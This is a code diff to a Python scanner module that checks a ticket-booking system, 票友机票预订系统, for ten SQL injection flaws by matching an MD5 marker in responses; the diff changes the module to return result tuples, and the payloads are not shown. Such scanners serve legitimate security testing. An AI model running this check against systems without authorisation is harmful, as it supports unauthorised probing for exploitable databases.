@@ -36,12 +36,14 @@ class piaoyou_ten_sqli_BaseVerify:
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                     cprint("[+]存在票友机票预订系统10处SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
-                    noexist = False
+                    return True, vulnurl, "票友机票预订系统10处SQL注入", vulnurl, req.text
             if noexist:
                 cprint("[-]不存在piaoyou_ten_sqli漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
